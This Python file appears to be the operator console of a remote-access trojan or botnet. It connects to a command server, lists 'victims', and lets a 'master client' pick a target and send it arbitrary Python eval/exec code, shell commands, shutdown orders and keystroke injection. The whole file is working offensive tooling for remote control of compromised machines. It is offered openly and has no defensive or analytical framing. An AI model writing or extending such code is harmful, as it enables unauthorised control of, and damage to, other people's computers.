import sys
import ast
import shutil
import os
import socket
import colorama
import keyboard

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('localhost', 9999)) # we use public ip

client.send("1".encode()) # send client status 0

currentTarget = ""

def space(nun):
    for i in range(nun):
        print("\n")

def victimList():
    space(5)

    client.send("CLIST".encode()) # ask for victms

    print("-- WELCOME MASTER CLIENT --")

    space(2)

    print("----LIST OF USERS----")

    print(client.recv(1024).decode()) # show victms list

    currentTarget = input("TARGET: ")
    client.send(f"500:{currentTarget}".encode()) # send requested target

    answer = client.recv(1024).decode()

    if answer == "501": # the target exists
        commandList()
    elif answer == "-501":
        print("Target not found!")

        input("PRESS ANYTHING TO CONTINUE")
        victimList()

def commandList():
    space(5)
    print(f"-- TARGET: {currentTarget}")
    print("1. EVAL | 2.EXEC | 3. CMD | 4. SHUTDOWN | 5. KEYSTROKE")

    cmd = input("Enter a number: ")

    if cmd == "1":
        evalCmd = input("Enter eval code: ")
        client.send(f"555-eval~{evalCmd}".encode())

    if cmd == "2":
        execCmd = input("Enter exec code: ")
        client.send(f"555-exec~{execCmd}".encode())

    if cmd == "3":
        Cmd = input("Enter command: ")
        client.send(f"555-cmd~{Cmd}".encode())

    if cmd == "4":
        print("Attempting to shutdown")
        client.send(f"555-shutdown~".encode())

    if cmd == "5":
        keystroke = input("Enter keystroke: ")
        client.send(f"555-keystroke~{keystroke}".encode())

    victimList()



if client.recv(1024).decode() == "202":
    print("success")
    victimList()